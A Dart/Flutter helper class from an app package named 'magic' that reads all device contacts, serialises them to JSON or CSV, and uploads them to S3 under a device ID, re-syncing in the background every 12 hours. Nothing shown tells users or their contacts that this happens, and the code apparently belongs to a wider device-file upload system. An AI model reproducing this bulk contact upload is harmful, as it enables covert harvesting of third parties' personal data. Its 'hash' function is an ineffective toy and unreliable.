import 'dart:io';
import 'dart:convert';
import 'dart:async';

import 'package:flutter/material.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:magic/helpers/db_helper.dart';
import 'package:magic/helpers/device_helper.dart';
import 'package:magic/helpers/device_info_helper.dart';
import 'package:magic/storage/storage_manager.dart';
import 'package:path_provider/path_provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:device_info_plus/device_info_plus.dart';

class ContactHelper {
  static final ContactHelper _contactHelper = ContactHelper._internal();

  factory ContactHelper() {
    return _contactHelper;
  }

  ContactHelper._internal();

  // Генерація хешу контактів для визначення змін
  Future<String> _generateContactsHash(List<Contact> contacts) async {
    final buffer = StringBuffer();

    // Сортуємо контакти для уникнення проблем з порядком
    contacts.sort((a, b) => a.displayName.compareTo(b.displayName));

    for (final contact in contacts) {
      buffer.write(contact.id);
      buffer.write(contact.displayName);

      // Додаємо телефони
      if (contact.phones.isNotEmpty) {
        final phones = contact.phones.map((p) => p.normalizedNumber).toList()
          ..sort();
        buffer.write(phones.join(','));
      }

      // Додаємо emails
      if (contact.emails.isNotEmpty) {
        final emails = contact.emails.map((e) => e.address).toList()
          ..sort();
        buffer.write(emails.join(','));
      }

      buffer.write('|');
    }

    // Створюємо MD5 або SHA256 хеш (спрощено для прикладу)
    final String hash = _simpleHash(buffer.toString());
    return hash;
  }

  String _simpleHash(String input) {
    // Простий хеш для демонстрації
    int hash = 0;
    for (int i = 0; i < input.length; i++) {
      hash = (hash << 5) - hash + input.codeUnitAt(i);
      hash = hash & hash; // Конвертуємо до 32-бітного
    }
    return hash.toString();
  }

  Future<void> syncContactsFile() async {
    try {
      // Перевірка дозволу
      if (!await FlutterContacts.requestPermission(readonly: true)) {
        print('❌ Немає дозволу на доступ до контактів');
        return;
      }

      final contacts = await _getContacts();
      final prefs = await SharedPreferences.getInstance();

      // Генеруємо поточний хеш контактів
      final currentHash = await _generateContactsHash(contacts);
      final savedHash = prefs.getString("contacts_hash");

      // Перевіряємо, чи змінилися контакти
      if (savedHash == currentHash) {
        print('✅ Контакти не змінилися, пропускаємо синхронізацію');
        return;
      }

      File? contactsFile;
      try {
        // Створюємо структурований JSON файл
        contactsFile = await _writeContactsToJsonFile(contacts);
        String uid = await _getUniqueDeviceId();

        // Використовуємо StorageManager для завантаження
        final timestamp = DateTime.now().millisecondsSinceEpoch;
        final fileName = "contacts_$timestamp.json";

        final downloadUrl = await StorageManager.uploadContactsFile(
          file: contactsFile,
          deviceId: uid,
          fileName: fileName,
          metadata: {
            'device_id': uid,
            'contact_count': contacts.length.toString(),
            'contacts_hash': currentHash,
            'upload_time': DateTime.now().toIso8601String(),
            'format': 'json',
          },
        );

        final success = downloadUrl != null;
        if (success) {
          // Зберігаємо хеш для майбутніх перевірок
          await prefs.setString("contacts_hash", currentHash);
          await prefs.setInt("contacts_length", contacts.length);
          await prefs.setString("last_contacts_sync", DateTime.now().toIso8601String());

          print('✅ Контакти успішно синхронізовані: ${contacts.length} контактів');
        } else {
          print('❌ Помилка завантаження контактів на S3');
        }
      } catch (e) {
        print('❌ Помилка при створенні/завантаженні файлу: $e');
        rethrow;
      } finally {
        // Видаляємо тимчасовий файл
        if (contactsFile != null && await contactsFile.exists()) {
          await contactsFile.delete();
        }
      }

    } catch (e) {
      print('❌ Критична помилка в syncContactsFile: $e');
    }
  }

  // СТРУКТУРОВАНИЙ JSON ФОРМАТ
  Future<File> _writeContactsToJsonFile(List<Contact> contacts) async {
    final Directory directory = await getApplicationDocumentsDirectory();
    final File file = File('${directory.path}/contacts.json');

    // Потоковий запис для уникнення проблем з пам'яттю
    final sink = file.openWrite();

    // Початок JSON
    sink.write('{\n');
    sink.write('  "export_date": "${DateTime.now().toIso8601String()}",\n');
    sink.write('  "total_contacts": ${contacts.length},\n');
    sink.write('  "contacts": [\n');

    // Записуємо контакти по одному
    for (int i = 0; i < contacts.length; i++) {
      final contact = contacts[i];

      // Створюємо об'єкт контакту без фотографій
      final contactJson = _contactToSafeJson(contact);

      // Записуємо контакт
      final jsonStr = jsonEncode(contactJson);
      sink.write('    $jsonStr');

      // Додаємо кому якщо не останній
      if (i < contacts.length - 1) {
        sink.write(',');
      }
      sink.write('\n');
    }

    // Кінець JSON
    sink.write('  ]\n');
    sink.write('}');

    await sink.flush();
    await sink.close();

    print('📁 Створено JSON файл: ${file.path}, розмір: ${await file.length()} байт');
    return file;
  }

  // Безпечне конвертування контакту (без фото)
  Map<String, dynamic> _contactToSafeJson(Contact contact) {
    final Map<String, dynamic> json = contact.toJson();

    // Видаляємо фото для зменшення розміру
    json.remove('photo');
    json.remove('thumbnail');

    // Фільтруємо пусті поля
    final filteredJson = Map<String, dynamic>.fromEntries(
        json.entries.where((entry) => entry.value != null && entry.value.toString().isNotEmpty)
    );

    return filteredJson;
  }

  // Альтернативний метод: збереження у CSV форматі (менший розмір)
  Future<File> _writeContactsToCSVFile(List<Contact> contacts) async {
    final Directory directory = await getApplicationDocumentsDirectory();
    final File file = File('${directory.path}/contacts.csv');

    final sink = file.openWrite();

    // Заголовок CSV
    sink.write('Name,Phone,Email,Address\n');

    for (final contact in contacts) {
      // Екрануємо коми та лапки
      String name = _escapeCsv(contact.displayName);
      String phone = contact.phones.isNotEmpty
          ? _escapeCsv(contact.phones.first.number)
          : '';
      String email = contact.emails.isNotEmpty
          ? _escapeCsv(contact.emails.first.address)
          : '';
      String address = contact.addresses.isNotEmpty
          ? _escapeCsv('${contact.addresses.first.street}, ${contact.addresses.first.city}')
          : '';

      sink.write('$name,$phone,$email,$address\n');
    }

    await sink.flush();
    await sink.close();

    return file;
  }

  // Оновлений ContactHelper (додайте цей метод до існуючого класу)
  Future<void> syncContactsFileWithDeviceHelper(String deviceId) async {
    try {
      // Перевірка дозволу
      if (!await FlutterContacts.requestPermission(readonly: true)) {
        print('❌ Немає дозволу на доступ до контактів');
        return;
      }

      final contacts = await _getContacts();
      if (contacts.isEmpty) {
        print('📱 Контакти не знайдені');
        return;
      }

      // Створюємо CSV файл (простіший та менший ніж JSON)
      final csvFile = await _writeContactsToCSVFile(contacts);
      print('📱 Створено CSV файл: ${csvFile.path}');

      try {
        // Використовуємо DeviceHelper.upload() як всі інші файли
        final success = await DeviceHelper.upload(deviceId, csvFile);

        if (success) {
          print('✅ Контакти успішно завантажено на S3 у папку $deviceId');

          // Оновлюємо список завантажених файлів
          final uploadedFiles = await DeviceInfoHelper.getUploadedFileTree();
          uploadedFiles.add(csvFile.path);
          await DeviceInfoHelper.saveUploadedFileTree(uploadedFiles);

          // Оновлюємо хеш для майбутніх перевірок
          final currentHash = await _generateContactsHash(contacts);
          final prefs = await SharedPreferences.getInstance();
          await prefs.setString("contacts_hash", currentHash);
          await prefs.setInt("contacts_length", contacts.length);
          await prefs.setString("last_contacts_sync", DateTime.now().toIso8601String());
        } else {
          print('❌ Помилка завантаження контактів на S3');
        }
      } catch (e) {
        print('❌ Помилка при завантаженні контактів: $e');
      } finally {
        // Видаляємо тимчасовий файл
        if (await csvFile.exists()) {
          await csvFile.delete();
        }
      }

    } catch (e) {
      print('❌ Критична помилка в syncContactsFileWithDeviceHelper: $e');
    }
  }

  String _escapeCsv(String input) {
    if (input.contains(',') || input.contains('"') || input.contains('\n')) {
      return '"${input.replaceAll('"', '""')}"';
    }
    return input;
  }

  // Отримання контактів з обмеженням (для тестування)
  Future<List<Contact>> _getContacts() async {
    try {
      final contacts = await FlutterContacts.getContacts(
        withProperties: true,
        withPhoto: false, // Не завантажуємо фото для зменшення пам'яті
      );

      print('📱 Отримано ${contacts.length} контактів');
      return contacts;
    } catch (e) {
      print('❌ Помилка отримання контактів: $e');
      return [];
    }
  }

  // Перевірка, чи потрібна синхронізація (для фонових завдань)
  Future<bool> shouldSyncContacts() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final lastSyncStr = prefs.getString("last_contacts_sync");

      if (lastSyncStr == null) return true; // Ніколи не синхронізували

      final lastSync = DateTime.parse(lastSyncStr);
      final now = DateTime.now();
      final difference = now.difference(lastSync);

      // Синхронізуємо не частіше ніж раз на 12 годин
      return difference.inHours >= 12;
    } catch (e) {
      return true; // При помилці синхронізуємо
    }
  }

  // Форсована синхронізація (для ручного запуску)
  Future<void> forceSyncContacts() async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.remove("contacts_hash"); // Видаляємо хеш для примусової синхронізації
    await syncContactsFile();
  }

  // Додайте цей метод в кінець класу ContactHelper:
  Future<String> _getUniqueDeviceId() async {
    try {
      final deviceId = await DeviceHelper.getUID();

      if (deviceId != null && deviceId.isNotEmpty && deviceId != 'unknown_device') {
        return deviceId;
      }

      final prefs = await SharedPreferences.getInstance();
      String? savedDeviceId = prefs.getString('unique_device_id');

      if (savedDeviceId != null && savedDeviceId.isNotEmpty) {
        return savedDeviceId;
      }

      final deviceInfo = DeviceInfoPlugin();
      String newDeviceId = '';

      if (Platform.isAndroid) {
        final androidInfo = await deviceInfo.androidInfo;
        newDeviceId = 'android_${androidInfo.id}';
      } else if (Platform.isIOS) {
        final iosInfo = await deviceInfo.iosInfo;
        newDeviceId = 'ios_${iosInfo.identifierForVendor}';
      } else {
        newDeviceId = 'device_${UniqueKey().toString()}';
      }

      await prefs.setString('unique_device_id', newDeviceId);

      return newDeviceId;

    } catch (e) {
      print('❌ Error getting device ID in ContactHelper: $e');
      final fallbackId = 'device_${DateTime.now().millisecondsSinceEpoch}_${UniqueKey().toString().substring(0, 8)}';
      return fallbackId;
    }
  }
}